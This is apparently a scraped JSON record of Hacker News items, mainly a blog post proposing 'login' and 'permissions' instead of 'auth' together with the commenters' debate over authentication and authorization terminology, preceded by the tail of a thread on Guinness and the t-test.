admit. reply mrob 4 hours agoparentThe nitrogen is just a propellant for forcing the beer through tiny holes that make the dissolved CO2 come out of solution in tiny bubbles, which form a more stable foam. Very little nitrogen actually dissolves into the beer. reply chillingeffect 18 hours agoprev [–] Wow, forcing visitors to individually disable 6 types of cookies. :thumbsdown.tif: reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Guinness Brewery is the birthplace of the t-test, a key statistical method for determining statistical significance.",
      "William Sealy Gosset developed the t-test in the early 20th century to improve product consistency at Guinness by interpreting data from small sample sizes.",
      "Published under the pseudonym \"Student,\" the t-test helps distinguish between actual deviations and natural variations in sample data and remains essential in scientific research."
    ],
    "commentSummary": [
      "The text covers a broad range of topics, from the invention of the t-test at the Guinness brewery to historical events like the Balfour Declaration and the Israeli-Palestinian conflict.",
      "It critiques the superficial treatment of mathematics in statistics education and debates the merits of teaching statistics versus calculus, emphasizing the importance of understanding mathematical concepts over rote procedures.",
      "The discussion also touches on the role of open-source software security, corporate policies on research accessibility, and the economic benefits of statistical techniques like the t-test and ANOVA."
    ],
    "points": 361,
    "commentCount": 117,
    "retryCount": 0,
    "time": 1716756922
  },
  {
    "id": 40491480,
    "title": "Clarifying \"Auth\": Use \"Login\" for Authentication and \"Permissions\" for Authorization",
    "originLink": "https://ntietz.com/blog/lets-say-instead-of-auth/",
    "originBody": "technically a blog homeblog / tagssletterprojects Instead of \"auth\", we should say \"permissions\" and \"login\" Monday, May 27, 2024 Most computer systems we interact with have an auth system of some kind. The problem is, that sentence is at best unclear and at worst nonsense. \"Auth\" can mean at least two things: authentication or authorization1. Which do we mean for an \"auth system\"? It's never perfectly clear and, unfortunately, we often mean both. This is a widespread problem, and it's well known. One common solution, using the terms \"authn\" and \"authz\", doesn't solve the problem. And this isn't just confusing, it leads to bad abstractions and general failures! The current terms fall short Calling things just \"auth\" is common. It's used in library names (django-allauth is for authentication, and go-auth is also authentication), package names (django.contrib.auth, which does both authentication and authorization), and even company names. Since \"auth\" can mean two things, this naming leads to ambiguities. When you see a new auth library or product, you don't know right away what it's able to handle. And when you talk about it, it's also not clear what you're referring to. The canonical solution is to call these \"authn\" and \"authz\", the n and z evoking the longer words. Thes are just not satisfactory, though. They're clunky and hard to understand: they're not universal enough to be able to skip explanation; they're easy to mishear and are close together; and what verb forms would we even use? It's not just about bad communication, though. This terminology implies that the two concepts, authentication and authorization, are more closely related than they are. It encourages bad abstractions to combine them, because we have one word, so we feel like they should belong together. But they are two pretty fundamentally distinct problems: checking who you are2, and specifying access rights. There are some links between auth and auth3, because what you can do is tied to who you are. But they're also very different, and deserve to be treated that way. At the very least, recognizing that they're different leads to recognition that solving one does not solve the other. Intead, use \"permissions\" and \"login\" We should always use the most clear terms we have. Sometimes there's not a great option, but here, we have wonderfully clear terms. Those are \"login\" for authentication and \"permissions\" for authorization. Both are terms that will make sense with little explanation (in contrast to \"authn\" and \"authz\", which are confusing on first encounter) since almost everyone has logged into a system and has run into permissions issues. There are two ways to use \"login\" here: the noun and the verb form. The noun form is \"login\", which refers to the information you enter to gain access to the system. And the verb form is \"log in\", which refers to the action of entering your login to use the system. \"Permissions\" is just the noun form. To use a verb, you would use \"check permissions.\" While this is long, it's also just... fine? It hasn't been an issue in my experience. Both of these are abundantly clear even to our peers in disciplines outside software engineering. This to me makes it worth using them from a clarity perspective alone. But then we have the big benefit to abstractions, as well. When we call both by the same word, there's often an urge to combine them into a single module just by dint of the terminology. This isn't necessarily wrong—there is certainly some merit to put them together, since permissions typically require a login. But it's not necessary, either, and our designs will be stronger if we don't make that assumption and instead make a reasoned choice. 1 Or their associated verb forms, of course. Respectively, these would be \"authenticate\" or \"authorize.\" ↩ 2 Authentication is more precisely proving an assertion. It's just most often used to show that you're the user you say you are. But you can authenticate plenty of other things, too. ↩ 3 Sorry, had to make a point here. ↩ If this post was enjoyable or useful for you, please share it! If you have comments, questions, or feedback, you can email my personal email. To get new posts and support my work, subscribe to the newsletter. There is also an RSS feed. Want to become a better programmer? Join the Recurse Center! Want to hire great programmers? Hire via Recurse Center!",
    "commentLink": "https://news.ycombinator.com/item?id=40491480",
    "commentBody": "Instead of “auth”, we should say “permissions” and “login” (ntietz.com)320 points by tambourine_man 3 hours agohidepastfavorite190 comments aeonik 2 hours ago\"Authorize\" and \"Authenticate\" are excellent words. They go back to medieval times and haven't changed meaning too much. Everybody knows what an \"authority\" is. It means they have power or capability. Everybody knows what authentic means. Something that is proven to be genuine. The difference between the two concepts, as they are used in crypto systems are specific, important to get right, and also inherently intertwined, confusing, and subtle. I'm skeptical that changing the words would help. It's one of the many reasons we have the saying, \"Don't roll your own crypto.\" Trust and verification are just hard problems. reply ghnws 2 hours agoparentHaving two almost identical terms that mean completely different things is not a very good idea. Also here you are explaining what the words mean, when \"login\" and \"permission\" are immediately obvious. Most people don't speak english natively either. reply 4death4 2 hours agorootparentI don’t really consider making an API call as “logging in”. The term sounds really out of place other than in a few specific contexts. reply Too 1 hour agorootparentThe term “Identify” is a lot better in this regard. It’s already universally used in IAM, where the other half of the puzzle is also clear and free from ambiguity: “Access”. reply asalahli 41 minutes agorootparentIdentification and authentication are different, though. You identify yourself to a website as a specific user (e.g. using a username) and the website in turn authenticates your claim, i.e. verifies that you are in fact the user you claim to be (e.g. using that user's password). reply amne 16 minutes agorootparentIf you go that route .. your OIDC provider authenticates your claim. The website just trusts some specific OIDC authorities which you must use to create your identity. reply zer00eyz 49 minutes agorootparentprevIdentity/identify may or may not have anything to do with Login, or Authentication... KYC (know your customer) are about removing the ambiguity between you user and their identity.... reply recursive 31 minutes agorootparentWhat could be a difference between identification and authentication? In my understanding they are completely synonymous. I frequently use an IdP (identity provider) to authenticate for web applications. reply duncan-donuts 9 minutes agorootparentI think authentication is about proof of identity. Identity can mean a lot of things imo. Applications identify me all the time without me giving them any proof of who I am. This happens in meatspace all the time too. People project identity and we make assumptions about what we observe. We don’t necessarily ask them to very this identify through mutually agreed upon terms. reply jbverschoor 1 hour agorootparentprevAccess doesn’t cover everything though. But identify seems good reply jonplackett 1 hour agorootparentI think they mean use both - identity in place of login/authenticate and access in place of auth reply jbverschoor 6 minutes agorootparentYeah, but access to me feels like access to records. Not necessarily permissions to do certain actions (in general or to certain records) Iirc, Java or J2EE used “Principal”, which I found super confusing adolph 1 hour agorootparentprevAnd the third half, “management” verbalizes the action therein. Also, IAM has a cryptic assertion of ultimate authority: In Hebrew, . . . hayah carries the added weight of representing God himself: Yahweh, “I am.” [0] https://hebraicthought.org/meaning-of-gods-name-i-am-exodus/ reply rwoerz 1 hour agorootparentprevIndeed. \"Logging in\" implies some kind of long lasting session. And logging in conceptually only requires \"identification\" (e.g. via a username) but not necessarily \"authentication\" (e.g. via a password) reply nmz 1 hour agorootparentIdentification is not necessarily via a username, people can identify you via just knowing how you look or your voice, the method doesn't matter. reply jagged-chisel 48 minutes agorootparentprevIMO… To “log in” is to convert the username/password pair (or API key, or whatever) into a smaller token with an expiration. Doesn’t matter of it’s put in a cookie in my browser, held in memory by some other API client, etc. Aside: Why bother even doing that? Because every time you transmit the credential, there’s the possibility of leaking. We would rather leak the token that has an expiration. reply mistercow 1 hour agorootparentprevThe wild thing is that they’re apparently from different etymologies. “Authorization” comes from “auctor” in Latin, meaning “leader” or “author”, whereas “authentication” originally comes from the Greek “auto” meaning “self”. There probably was some cross influence that brought them into line though. reply mepiethree 1 hour agorootparentprevI don’t think they are almost identical, they just have the same prefix. “Login” and “permission” each have the same problem: “login” is very similar to “logging”, and “permission” shares a prefix with “persistence” (or permanent). Ultimately software engineering is a broad enough field that we will necessarily have to use similar words to describe the many, many concepts reply pjerem 1 hour agorootparentThe issue is that they have the same prefix AND that unfortunately this prefix is used to abbreviate both words. What does the \"auth\" module ? reply diego_sandoval 52 minutes agorootparentWe shouldn't use that abbreviation, then. reply bigyikes 21 minutes agorootparentprevNot a good analogy. “Permission” and “persistence” have the same prefix but entirely different semantics. They also occur more commonly in everyday life. AuthN and AuthZ are similar in in spelling, appear in similar contexts, and are less colloquial, making the distinction a lot less clear. There’s a reason many junior devs use them interchangeably without knowing better. reply croes 1 hour agorootparentprevBut authentication and authorization are often used in the same context where confusion is lethal. reply coldtea 27 minutes agorootparentWhy would it be \"lethal\"? As a dev you're either building or hooking up to either or both of them. And you know what each requires you to build / hook up to. As a user, you just care \"I put my login/password/api key here, and I get the capability to do several things in that webpage/service/etc\". Both auth and the other auth are handed for you. reply bru 1 hour agorootparentprevThat's because they share the same root auto-, i.e. \"self\". Because they're related concepts... reply gtirloni 1 hour agorootparentprevwhat's the difference between login and logon? reply rockemsockem 34 minutes agorootparentprevYou're saying that they are almost identical because they share the first 4 letters.... That's a pretty low bar. reply cwilby 1 hour agoparentprevSaw the headline, found your comment within two seconds, exhaled with relief. Every time a cohesive pair of words is redefined, a new JS framework is born. reply OJFord 38 minutes agorootparentYeah me too, but then I actually read the (very short) article, which immediately addresses that and not much else. Better title would be 'instead of authz & authn ...' to make that clear, because it does just sound like they haven't heard of the concept at first. reply hackernewds 2 hours agoparentprevAuth means authentication or authorization? that's the dilemma reply theptip 2 hours agorootparentThe industry has used “authz” and “authn” to disambiguate for decades. reply cdelsolar 1 hour agorootparentI’ve been working in this industry for decades and this is the first time I made that connection… reply foobazgt 1 hour agorootparentI can second GP. I have always heard and used authz and authn (pronounced auth-z and auth-n). Bare \"auth\" typically was used to mean both, but IAM was more clear for that in specific contexts. E.G. you might say someone \"authed\" to indicate both authentication and authorization, and you might have an IAM team that handles both authentication and authorization. FWIW, I lead an IAM team. reply bostik 1 hour agorootparentprevThe distinction was already present in Apache2 configs in early 2000's, although there authentication was \"auth\", and \"authorisation\" was authz. Real travesty came from OAuth. A system designed to handle authorisation was named after the term for authentication. reply recursive 29 minutes agorootparentBut then it mostly ended up getting used for authentication anyway, so maybe it was ok. reply mgkimsal 1 hour agorootparentprevyou're not alone. reply erik_seaberg 1 hour agorootparentprevI've seen https://en.wikipedia.org/wiki/AAA_(computer_security) because authentication, authorization, and accounting (audit trails) need to go together so often. You need to know who they really are and whether they're abusing the system. reply croes 1 hour agorootparentprevOne type and you have a problem. Maybe it's better to use less similar words if it's security related. reply mgkimsal 1 hour agorootparentprevHow are those pronounced? reply giaour 42 minutes agorootparentYou pronounce the last letter as a second syllable: authn is \"auth-in\" and authz is \"auth-zee\" (probably \"auth-zed\" in non-American English). reply selecsosi 2 hours agorootparentprevAuthN and AuthZ are appropriate and succinct ways to express the concerns when brevity is required reply spacebanana7 10 minutes agorootparentAuthZ is troublesome in British English domains where the usual spelling is Authorisation. reply croes 1 hour agorootparentprevSo one wrong letter or wrong auto complete and we have the wrong meaning. In security, anything that is less prone to error is good, so words that are hard to confuse or misspell are good. reply selecsosi 1 hour agorootparentWhy would you type the wrong letter when you mean the other one? Authentication means proving what something says it is, authorization is allowing someone to do something. The concepts are different so it's not like a dial you are turning to make a measurement, the terms are for different domains reply deathanatos 1 hour agorootparentWhile I also agree that authn or authz are perfectly clear, > Why would you type the wrong letter when you mean the other one? Really? Ignorance, laziness, rushing, fatigue, simple mistakes, etc. What I think is worse is more letters doesn't save you. I've had some conversations where it has gone like 2–3 round trips before the other end realizes that \"not\" means not, and they mean … the other way. reply baronvonsp 33 minutes agorootparentprevThese are widely-used industry terms that have been used for decades. If that was a problem, surely we would have seen it by now? Replacing terms - that have been around so long that many systems' behaviors map to them closely - with new terms that don't quite overlap seems wildly more likely to create ambiguity and confusion. reply dathinab 48 minutes agorootparentprevyes but it's also even more important to be precise and correct which login/permission fail to be login is at best defined as authorization + authentication but things which are in general referred to as login but only provide authorization are not that rare (e.g. you pass a token to a client) and logins which to provide authentication but not authorization exist to (but are rare and you probably could always nitpick them out of existence) Similar the term permission is hugely overloaded due to it's wide usage in more causal most times end user facing documentation. Most times permissions are used in a more generic context, like a user having the permission to do something vs. a request made by a user being authorized to do something. I mean in the end there is no reason not to use login/permission for end-user facing documentations, causal conversations etc. This terms are \"good enough\" most times. But if you provide a login library or technical documentation for APIs with complex interactions between authentication and authorization then using login/permission just won't cut it. Also for AuthN,AuthZ there is no point to use auto completion and there is very very little chance to mistype them as long as you don't confused them. Luckily this kind of mistakes do not fall under the patterns dyslexia causes (especially if you do the capitalization). reply bradjohnson 1 hour agorootparentprevIdentity and permission are often closely related, and usually auth means both. If we replaced auth with permissions and login, I suspect we would still encapsulate the same overarching concept with one of those two words anyway. E.g. use the login module to add permissions to a user or use the permissions module to authenticate. reply alex_lav 2 hours agorootparentprevSure, so why would we replace the two words that have correct meaning when the real problem is laziness? reply croes 1 hour agorootparentWe now have autocomplete that could choose the wrong word. reply alex_lav 1 hour agorootparentWe've had autocomplete that could choose the wrong word for over a decade. And? reply packetlost 2 hours agoparentprevI could see an argument for using the less precise terminology for user facing error messages, but certainly not on the technical side. reply jonplackett 1 hour agoparentprevThink you’re giving ‘Everybody’ a bit too much credit. reply schrodinger 22 minutes agoparentprevI agree and was going to say the same thing, so instead I'll elaborate on another angle. (Also—don't shorten to auth solves the vast majority of this debate.) Some things in computer science are just plain \"hard,\" and no amount of renaming or abstracting is going to solve it; you either need to take the time to understand it (i.e. learn authenticate = prove you who are, authorize = what are you allowed to do), or outsource the prob (e.g. \"don't roll your own crypto\"). Similar problems: - Time. It's non-linear in calendar representations because of definition changes by humans. There are gaps in years trying to reconcile different calendars. There are leap seconds added based on scientific measurements, non-deterministic ways. Time zones enough confuse people. 99% of the time you can use something like \"duration since 1970 UTC\" (unix epoch) but you may eventually hit non-linearities if you try and say \"once every 10 days\" by doing 10 * secs / day. - Names. Different all over the world. I won't even give examples because I'm still a bit confused, I recently learned that in parts of India first name and surname are reversed, so not even consistent in one country. Prob best to just put a \"Name\" field and a \"Nickname / Display Name\" field and let the user decide. - Geodistance. The Earth is not a sphere, it's an \"oblate ellipsoid\" since the spinny makes the middle bulge. There are many ways to calculate distance between two coords and generally simple ones will work for majority of settlements. But if your customers are near the poles, or maybe include flight paths, etc the errors could be very significant. I've had this leak out in cases like Postgres where you can use the sphere approximation (much faster) or the proper calculationg (much slower) when running a query like \"give me all points within a x mile radius\". Auth (hah!) is just another one intrinsically difficult concept that's not made more complex by language and can't be simplified away. reply ysofunny 2 hours agoparentprevover many years, I've noticed how it's all about differences that get more subtle and precise on every field. I think this specially after watching this the introduction of https://www.youtube.com/watch?v=OMaYFUm8kQQ this is specially complicated in fields with long histories. I've got an example that may only make sense in both english and spanish: fats, oils, gases/gasolines (grasas, aceites... gasolinas, petroleo) other subtelties fresh on my mind today: proposition vs axiom argument vs parameter (common) case law vs civil law reply divan 1 hour agoparentprev> Everybody knows ... Especially non-native English speakers, right. reply diego_sandoval 44 minutes agorootparentThe Spanish words are very similar to the English ones: - Autorización : Authorization - Autenticación : Authentication - Autoridad : Authority - Auténtico : Authentic I would guess that in other romance languages, they are also similar to the English version. \"Log In\", on the other hand, only makes sense in English. If you tell someone \"Estoy registrando adentro\" they will be dumbfounded. reply redeeman 59 minutes agorootparentprevwell either they know the language to some functional degree, or they dont. reply blablabla123 41 minutes agoparentprevYeah but it's hard to understand unless doing a lot with auth. Indeed \"don't roll you own crypto\" but you don't need a PhD in Mathematics to roll you own auth. Sometimes it's necessary and even if not, it's good to know what could need work. reply bossyTeacher 31 minutes agoparentprevOld isn't always better. Also, I love how you say that everybody knows the meaning of those words yet you feel compelled to provide the meaning. Doesn't really make a good case in your favour. I highly doubt laymen would understand the difference when using \"authorize\" and \"authenticate\" as opposed to \"permission\" and \"login\". I would bet you $100 in bitcoin that most people would understand the latter. reply bsder 52 minutes agoparentprev> inherently intertwined, confusing, and subtle. Our current implementations are like this. I'm not convinced this is inherent complexity, though. It seems like almost all the complexity stems from people trying to create hooks to monetize all the pieces of the process. Security and usability feel like a second and distant third in importance. reply charles_f 2 hours agoparentprev> Everybody knows what an \"authority\" is. It means they have power or capability. > > Everybody knows what authentic means. Something that is proven to be genuine. And yet a lot of the devs I work with (I'd even go a say most) can't really explain to you the difference between both concepts and use \"auth\" as a blanket keyword ; which that word allows since it has the same root. I think that proposal isn't bad because it makes a distinction using simpler words. I'd also prefer for people to learn that simple difference, but that's what we get. reply oooyay 2 hours agorootparentSome time ago authentication was shortened to authn and authorization was shortened to authz. If I had to guess that was to aid people who had to write those words a lot. In that aid, I think they've somewhat lost meaning and just became generalized as \"auth\". People generally do know there are two steps to auth, are aware of the standards, but when asked to put it in words struggle because of some lexical convergence. An analog to this is when I first stumbled upon words like a11y and i18n I had no idea what they meant. Now that I've actually had to deal with internationalization systems and accessibility systems I know very much what they mean, but similar to \"auth\" they're an umbrella invoking a large number of systems that can all function differently. reply dergyitheron 2 hours agoparentprevIt's not that simple for non-native English speakers, not everyone works in an international team so English is being used on a technical level and you basically have to memorize what those words mean if they dont have similar sounding equivalent in your native language. And there people mess it up or simplify the terms by combining them and it doesn't make sense. And you wouldn't use your native language equivalents because docs are usually in English and we code naming things in English. Using those dumber terms would be much more straightforward for everyone. reply marcosdumay 1 hour agorootparent> non-native English speakers Hum... I imagine you mean people without any Latine inheritance in their culture. Those words are very good words on way more languages than English. Those words are also shared with other domains, where they have compatible meanings, and that intersect the usage in computer systems. So you'd better fix them there too. Besides \"permission\" is not a verb, and \"login\" is one between a lot of different ways to authenticate people. What do you intend to do with the correct meaning of those words once you overload them? reply DowagerDave 3 hours agoprevI don't really get the point of this post. Yes naming things is hard, but the fact that these two words are similar is actually a good thing, despite laypersons getting them confused, because they are both functionally and implementation-wise closely related. The confusion is not going to be solved with trying to relabel the concepts. The author never actually illustrates the harm caused by this confusion either. My guess is they ran into something like installing a package that didn't cover their desired needs, attributed this to the \"auth\" name and instead of moving on decided to write about it. >> \"The canonical solution is to call these \"authn\" and \"authz\", the n and z evoking the longer words.\" or we could just use the longer words? reply billsmithaustin 3 hours agoparentMy experience: a lot of the confusion in technical conversations is due to two parties using the same term for different but related concepts. Relabeling the concepts to clarify the distinction is the right thing to do. >> or could we just use longer words? Agreed: relabeling, with longer words when necessary, can help. reply AlienRobot 3 hours agorootparentFun parallel: https://inkscape-manuals.readthedocs.io/en/latest/_images/in... The toolbar is called \"tool controls bar,\" the tool controls bar at the left is called \"toolbox,\" and the toolbox at the right is called \"commands bar.\" If you asked me I'd say it's 3 toolbars. And why is palette not palette bar? reply forkerenok 55 minutes agorootparent> And why is palette not palette bar? My guess that's because palette, the real world object, is something close to a bar itself, so it would be a bit of tautology. From the dictionary: Palette: a thin board or slab on which an artist lays and mixes colours. reply ape4 3 hours agoparentprevSince nobody else has mentioned it... the Apache authn and authz modules https://httpd.apache.org/docs/2.4/mod/mod_authn_core.html https://httpd.apache.org/docs/2.4/mod/mod_authz_core.html reply dathinab 30 minutes agoparentprev> or we could just use the longer words? we could but don't expect anyone with dyslexia noticing that a text says authorization when they subconsciously expect authentication (and don't explicitly double check) Through also if we use AuthN and AuthZ (with capitalization) it's quite clearly readable and hard to mistype and no longer the kind of words dyslexia makes it easy to misread (it never was in the category of things dyslexia makes easy to accidentally mix up when writing I think). Using authorization and authentication also can have issues if you use a text editor with auto completion, for AuthuthZ you simply could not use autocompletion. > My guess is they ran into something like installing a package that didn't cover their desired needs, or got into problems because they used the wrong term in technical documentation, maybe in context of a security review or a requirements document which has been legally binding singed of > The confusion is not going to be solved with trying to relabel the concepts. Especially given that login likely implies both AuthN and AuthZ so it's not even \"just\" relabeling. reply test6554 3 hours agoparentprevHey, I wish electrons were assigned a positive charge and protons a negative one. Way back when. But oh well now. reply echoangle 2 hours agorootparentCan you explain why switching the names would be better? I don’t get it reply djaro 2 hours agorootparentBecause what we call electricity is electrons moving. So it would make sense for electrons to have the electric charge. Now we are in a weird situation where current flows from positive to negative, but electrons flow from negative to positive. It would be a lot more logical if the direction of the electrons was the direction of the current, but the name was arbitrarily decided before we knew what electrons were. reply cocoa19 2 hours agorootparentprevI remember some messy conventions in electronics as a reason. The conventional flow of current goes from positive terminal to negative. But electrons actually flow from negative terminal to positive. reply thayne 2 hours agorootparentprevBecause in an electrical current it is electrons that move (usually, unless you have a hydrogen plasma or something), so since electrons have a negative charge, the direction of the positive current is the opposite of the direction the electrons are flowing. reply thaumasiotes 2 hours agorootparentprevBy convention, electrical current flows in the direction of the movement of positive charge. However, in the typical case, what's moving is electrons, which means the \"current\" is flowing in the opposite direction of the movement of the electrons. This is stupid and everyone hates it. reply samatman 2 hours agorootparentprevIn addition to the sibling comments, I have a somewhat esoteric reason to wish that the signs of electric charge were reversed. In the coordinate system of an atom, the nucleus is at the origin, 0, while the electrons are a positive distance from that core. 0 is not negative, obviously, but it's non-positive. When terminology is concordant in this way, the topic is easier for a student to grasp. When discordant, harder. There's little chance for this wart to be remedied, invalidating every paper written up to that point is a bit of a non-starter. But I dislike it nonetheless. reply randomdata 1 hour agorootparentprev> and protons a negative one. A \"pro\" negative? That introduces a whole new confusion. reply inanutshellus 3 hours agoparentprevFor some reason, with both words, I have to stop and think about what the \"other auth- word\" is so I can be sure I'm thinking of this \"auth word\" correctly. 1. Sees1a. \"That's who I am, but to be sure...\" 2. \"Ehh... the other one is... ...\" 3. \" is what I'm allowed to do so...\" 4. \"...yes, this one is who i am\" Seriously, every time. I probably worried I'd remembered it backwards at one point early in my career and have never shaken the habit of double-checking myself on it. reply codelikeawolf 3 hours agorootparentI did the exact same thing when I was reading the post! I had to stop reading and take a good 10 seconds to verify which one was which in my head. I use \"auth\" all the time as a placeholder for \"you need to login to use this\". I've never really thought too much about authorization versus authentication because to me, those are just implementation details under the \"auth\" umbrella. reply pama 2 hours agorootparentprevI authorize you to be authentic! reply verdverm 3 hours agoprev\"Identity\" and \"Access\" Management (IAM) is pretty standard terminology. I personally like saying authnz (authentication and authorization mashed together) \"Login\" doesn't really cover token or key based authentication, i.e. service accounts don't \"log in\" but do require authentication and authorization reply marcosdumay 1 hour agoparent\"Identity\" and \"Access\" are really good names. I could easily adopt those if I find myself naming middleware again. reply bsid 3 hours agoparentprevAlso, IAM usually means SSO solutions for employees i.e. things like Okta/OneLogin.. CIAM usually means external facing authN/authZ.. (customer identity and access mgmt) There's so many terms in this space that are already confusing. reply verdverm 3 hours agorootparentSSO is really just the Identity part, and one way to prove identity, more conveniently across many systems. SSO misses the Access (permissions) part, which requires policies constraining the acting identity, the target, and the action to be performed reply deathanatos 1 hour agorootparentNo, they're still intertwined, unfortunately. For example, Okta has a notion of whether a user is \"authorized\" to use the app, so you can end up being directed to Okta, prompted to log in, and then shown an authorization error. Users will often phrase this as some odd form of \"not permitted to log into the app\". Further, Okta admins control the claims the user presents to the app, and those claims can often have authz implications. A \"role\" or \"group\" claim is the most obvious one. I've spent endless time going in circles with Okta administrators who can't clearly delineate these two, or who don't understand what an \"app\" (Okta's term for a relying party) is, etc. reply remram 1 hour agoparentprevIdentity and access seem much clearer to me. Not every identity determination is via log in, not every access check is purely based on permission. I will try and use identity/access/IAM instead of authn/authz/auth. reply jameshart 3 hours agoparentprevYes, this. Access control is bigger than just permissions. And identity is still relevant even for anonymous users. reply spicybbq 3 hours agoparentprev> I personally like saying authnz (authentication and authorization mashed together) a12n and a11n, if you will. reply verdverm 3 hours agorootparentwhich ideally are a11y (accessibility) reply Khaine 3 hours agoparentprevThe other term you might here is AAA: Authentication, Authorisation, and Accounting reply verdverm 3 hours agorootparentby Accounting, do you mean Audit Logs? reply candiddevmike 3 hours agorootparentThat is a form of Accounting, yes. There are others though, like metrics, and Accounting is meant to mean all of the recording/telemetry. reply verdverm 3 hours agorootparentI can see this thread rabbit-holing into logmon terminology :] reply chipdart 3 hours agoparentprev> \"Login\" doesn't really cover token or key based authentication, i.e. service accounts don't \"log in\" but do require authentication and authorization To build on top of this point, authentication also includes claims that are not tied to an authorization process, such as user agents or custom request headers, and authentication is often used not to reject access but to output subsets of data (I..e, hide fields from a response, send a specific response doc, etc) It's as if the whole industry uses the keyword \"auth\" for good reasons. reply sandworm101 2 hours agoparentprevThe modern parlance doesn't accommodate but the original \"log in\" and \"log out\" describes any time a use enters or leaves and is noted in the log. This goes back to shipping whereby persons entry or exit would be noted in a log. Imho that older definition would cover nearly every type of authentication that results in someone connecting to a service. reply jameshart 2 hours agorootparentSadly most of modern communication infrastructure is built on the stateless substrate of HTTP, where every interaction starts from a fresh slate. And zero trust networking suggests we should not rely on border checks to let people 'in' and 'out', but rather check access control at every interaction. Really, modern practice has moved past 'log in', sorry. reply klabb3 1 hour agorootparentYes. But logging in still happens - you just get a token in response and use it for subsequent communication within some time period. It’s still a bad term for an identity / authentication system because logging in is just one small part of it. reply verdverm 2 hours agorootparentprevThis doesn't seem to cover API keys or bots, which have authentication mechanisms, but who's typical workflows lack the \"enters\" or \"leaves\" concepts you describe. For example, I can log into OpenAI, generate an API key, log out, and then use that key to access their systems across a network reply thayne 58 minutes agoprev> This terminology implies that the two concepts, authentication and authorization, are more closely related than they are. But they are closely related. You can't really have authorization without some form of authentication. Both are tied to some kind of identity. And in some cases, such as SSO, authentication involves authorization from another system. Also, login is not a good replacement for authentication, because there are forms of authentication that don't involve logging in at all. And often the act of logging in just exchanges one set of authentication credentials (username and password or equivalent) for another, shorter lived, set (token, cookie, etc.) Finally, one nice property of using authz and authn is that you can use \"auth\" to mean \"authentication and authorization\", since the two often go together. reply bazil376 3 hours agoprevI like it. The distinction between Authn and Authz isn’t nearly as obviously as login and permission. Sometimes I feel like we enjoy fancy terms more than we enjoy unambiguous terms. reply ziddoap 2 hours agoparent>login and permission. These words do not capture everything that authorization and authentication entail. As stated several times in this thread, permissions are specific part of what authorization entails, not the entirety. >Sometimes I feel like we enjoy fancy terms more than we enjoy unambiguous terms Authorization and authentication are unambiguous. reply coffeebeqn 3 hours agoparentprevEspecially when English is not your first language. These words are long and easy to mix up reply rockemsockem 29 minutes agorootparentI can empathize with this struggle, but I don't think that warrants changing terminology. reply lelanthran 3 hours agoparentprev> Sometimes I feel like we enjoy fancy terms more than we enjoy unambiguous terms. Could be we just enjoy precision more than anything else. For lay people, maybe authn and authz are poor words. For those of us working with those words, they're a lot better than login and permission. I don't really want to call a function to get a \"permission code\" instead of an \"authorization code\". reply ghnws 2 hours agorootparentAuthorization code? Do you mean authentication? reply lelanthran 1 hour agorootparentI don't mean authentication. An authorization code is something that is handed out to already authenticated identities. reply danielmarkbruce 1 hour agorootparentprevNo, they probably don't. They probably know exactly what they are saying. reply cpdean 2 hours agoparentprevBut how else will I signal my superiority over others if I use clear language??? reply bazil376 2 hours agorootparent;) reply kissgyorgy 3 hours agoprevI have worked with auth (:P) systems (IAM) a lot and I have never seen the problem with \"auth\" meaning both authorization and authentication. When more specificity is needed, just use the right phrase. Using \"login\" and \"permissions\" are worse IMO, because they don't catch the entire meaning and complexity of these systems. Authentication means way more than login, and permissions mean very specific things for a small portion of an authorization system. reply candiddevmike 3 hours agoparentIndeed, Authorization includes things like license checks, time of use restrictions, etc. reply hu3 1 hour agorootparent> Authorization includes things like license checks, time of use restrictions, etc. permission to use X license... (or whatever license check means in this context) permission to use at X time... reply macspoofing 1 hour agorootparentOf course, if you could just wave your magic wand and change the meaning of commonly understood words, you can make the semantics work. Unfortunately, you can't. In this case, \"permission to use at X time\" does not have the same meaning as \"permission to perform action X\". reply hu3 1 hour agorootparentI don't understand why would a magic wand or semantic gymnastics be required. One can implement different kinds of permissions for a given resource. Including ones related to license or time constraints. reply libria 40 minutes agoprevWe carry a physical analog of this in real life: work badge. My policy-enforced visible picture identifies who I am and that I match that photo and also gatekeeps me into and out of places I'm allowed to enter. > terminology implies that the two concepts, authentication and authorization, are more closely related than they are ... There are some links ... because what you can do is tied to who you are. But they're also very different AuthZ being entirely dependent on AuthN is not \"some links\". That's an unbreakable dependency. I can agree that these two words being a single letter apart are easy to conflate though. But as they are related, we're more likely to increase training/education around the concept rather than rename them. reply AbraKdabra 3 hours agoprevI've never been in a situation where this \"confusion\" happens (nor in english or spanish, where we use autenticación and autorización), authentication and authorization are standard terminology in all IT and Infosec. I know acronyms and stuff but if it creates confusion just use the damn complete word, I don't get why create a problem. reply mkroman 3 hours agoparentAgreed. Generally just avoid jargon when you aren't sure the reader knows the lingo. reply Pxtl 2 hours agoparentprevBecause people frequently in English use the abbreviation \"auth\", which is ambiguous. reply ziddoap 2 hours agorootparentSo people should not use the abbreviation when it isn't clear. Problem solved, no renaming needed. If people are too lazy/whatever to use the full word, they are going to be too lazy/whatever to change to a different word entirely. reply Someone1234 2 hours agorootparentNothing is being renamed. \"Permissions\" is another common name that dates until at least the 1980s in computing. The suggestion here is to use one common and correct phrase instead of another common and correct phase. Login/Identity are also completely standard. The only reason to keep using Auth/Auth is because you want to be less easily understood by others. Calling it \"renaming\" is itself odd to me, if someone said Identity/Permission or Login/Permission, it wouldn't even flag to me as being unusual or non-standard. I'd know exactly what they meant. reply ziddoap 2 hours agorootparent>The suggestion here is to use one common and correct phrase instead of another common and correct phase Permissions are a subset of authorization. reply hu3 1 hour agorootparentCould you please provide examples. I see comments stating that, but no examples. reply ziddoap 1 hour agorootparentPermissions are a technical method which are used to implement and enforce authorization policies. However, authorization policies are not composed of just permission controls. You may find that your user account has permission to read the employee salary database. However, you may not be authorized to read that database by corporate policy because you are not a manager. Perusing that database will still get you in trouble, because you aren't authorized to do so, even though your account had the technical permissions to access it. You may find that you have permissions to screenshot internal databases and post them on facebook, however since you are not authorized to do so by policy, you will be fired. Etc. reply danielmarkbruce 1 hour agorootparentprevYou have read permission on a file - generally used by humans, and UIs like on Google Drive etc to signify your ability to see a file at all, at some time, some location, from some machine. You have authorization - you are allowed to see the file now, from this machine attached to this network in this geographic location using this type of authentication. \"I have permission to see this file, but I can't access it outside the corporate network\" said many people lots of times. reply AbraKdabra 2 hours agorootparentprevSo the problem is the people not the words. reply xyst 3 hours agoprev“authn” and “authz” are sufficient to use 